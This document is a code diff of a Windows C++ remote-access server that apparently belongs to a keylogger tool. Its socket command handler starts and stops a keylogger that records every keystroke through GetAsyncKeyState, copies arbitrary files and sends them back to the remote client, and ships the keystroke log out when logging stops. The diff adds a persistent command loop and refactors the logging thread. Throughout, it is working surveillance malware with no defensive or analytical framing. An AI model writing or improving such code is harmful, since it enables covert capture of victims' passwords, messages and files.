@@ -202,71 +202,58 @@ void Server::handleClient(SOCKET clientSocket) {
     char recvbuf[512];
     int recvbuflen = 512;
 
-    // Receive data from the client
-    int result = recv(clientSocket, recvbuf, recvbuflen, 0);
-    if (result > 0) {
-        std::string receivedMessage(recvbuf, result);
-        std::cout << "Received message: " << receivedMessage << std::endl;
+    while (true) {
+        memset(recvbuf, 0, recvbuflen);  // Clear buffer
+        int result = recv(clientSocket, recvbuf, recvbuflen, 0);
 
-        if (receivedMessage == "shutdown") {
-            std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            shutdownServer();
-            exit(0);  // Exit the server program
-        }
-        if(receivedMessage == "restart"){
-            std::cout << "Restart command received. Server is restarting..." << std::endl;
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            restartServer();
-            exit(0);  // Exit the server program
-        }
-        if(receivedMessage == "startKeylogger"){
-            std::cout << "Keylogger command received." << std::endl;
-            startKeyLogger();
-            closesocket(listenSocket); 
-            exit(0);  // Exit the server program
-        }
-        else if(receivedMessage == "offKeylogger"){
-            std::cout << "Keylogger command received." << std::endl;
-            stopKeyLogger(clientSocket);
-            closesocket(listenSocket); 
-            exit(0);
-        }
-        else if (receivedMessage == "screenshot")
-        {
-            std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
-            // Take a screenshot and save it
-            // takeScreenshot("screenshot.png"); // Save as screenshot.png
-            std::cout << "Screenshot taken and saved as screenshot.png" << std::endl;
+        if (result > 0) {
+            std::string receivedMessage(recvbuf, result);
+            std::cout << "Received message: " << receivedMessage << std::endl;
 
-            // Send the screenshot back to the client
-            // sendScreenshot(clientSocket, "screenshot.png");
-            sendScreenshot(clientSocket, "screenshot.png");
-
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            exit(0);  // Exit the server program
+            if (receivedMessage == "shutdown") {
+                std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
+                shutdownServer();
+                closesocket(clientSocket);
+                closesocket(listenSocket);
+                break;  // Exit the loop to shut down
+            } else if (receivedMessage == "restart") {
+                std::cout << "Restart command received. Server is restarting..." << std::endl;
+                restartServer();
+                break;  // Optional: break to end client handling if restarting the server
+            } else if (receivedMessage == "startKeylogger") {
+                std::cout << "Keylogger command received." << std::endl;
+                startKeyLogger();
+            } else if (receivedMessage == "offKeylogger") {
+                std::cout << "Keylogger stop command received." << std::endl;
+                stopKeyLogger(clientSocket);
+                break;
+            } 
+            // else if (receivedMessage == "screenshot") {
+            //     std::cout << "Screenshot command received. Taking a screenshot..." << std::endl;
+            //     takeScreenshot("screenshot.png");
+            //     sendScreenshot(clientSocket, "screenshot.png");
+            // }
+            else if (receivedMessage.substr(0, 9) == "copy_file") {
+                std::istringstream iss(receivedMessage);
+                std::string command, sourceFileName, destinationFileName;
+                std::getline(iss, command, '|');
+                std::getline(iss, sourceFileName, '|');
+                std::getline(iss, destinationFileName);
+                copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
+            } else {
+                std::cout << "Unknown command received: " << receivedMessage << std::endl;
+            }
+        } else if (result == 0) {
+            std::cout << "Connection closing..." << std::endl;
+            break;
+        } else {
+            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
+            break;
         }
-        else if (receivedMessage.substr(0, 9) == "copy_file")
-        {
-            std::istringstream iss(receivedMessage);
-            std::string command, sourceFileName, destinationFileName;
-
-            // Parse the command
-            std::getline(iss, command, '|');
-            std::getline(iss, sourceFileName, '|');
-            std::getline(iss, destinationFileName);
-
-            // Call the method to copy the file and send it back
-            copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
-
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            exit(0);  // Exit the server program
-        }
-    } else if (result == 0) {
-        std::cout << "Connection closing..." << std::endl;
-    } else {
-        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
     }
+
+    closesocket(clientSocket);
+    exit(0);
 }
 
 // Implementation of copyFileAndSend
@@ -356,26 +343,7 @@ void Server::restartServer(){
 
 // Function to start keylogger
 
-void Server::sendLogFile(SOCKET clientSocket) {
-    std::ifstream logFile(logFilePath, std::ios::binary);
-    if (!logFile.is_open()) {
-        std::cerr << "Could not open log file.\n";
-        return;
-    }
 
-    logFile.seekg(0, std::ios::end);
-    size_t fileSize = logFile.tellg();
-    logFile.seekg(0, std::ios::beg);
-
-    // Read file contents into buffer
-    std::vector<char> buffer(fileSize);
-    logFile.read(buffer.data(), fileSize);
-    logFile.close();
-
-    // Send file contents to client
-    send(clientSocket, buffer.data(), buffer.size(), 0);
-    std::cout << "Log file sent to client.\n";
-}
 
 void Server::startKeyLogger() {
     isLogging = true;
@@ -390,17 +358,22 @@ void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
     if (keyLoggerThread.joinable()) {
         keyLoggerThread.join();
+    }else{
+        std::cerr << "Keylogger thread was not joinable.\n";
     }
+    
     copyFileAndSend(clientSocket, logFilePath, logFilePath);
 }
 
 // Main keylogger function
 void Server::keyLogger() {
-    FreeConsole();
+    // FreeConsole();
+    std::lock_guard<std::mutex> lock(logMutex);
     FILE* OUTPUT_FILE = fopen(logFilePath.c_str(), "a+");
     if (OUTPUT_FILE == nullptr) return;
 
     while (isLogging) {
+     
         Sleep(10);
         for (int i = 8; i <= 255; i++) {
             if (GetAsyncKeyState(i) == -32767) {
@@ -420,7 +393,7 @@ void Server::keyLogger() {
             }
         }
     }
-
+ 
     fclose(OUTPUT_FILE);
 }
 
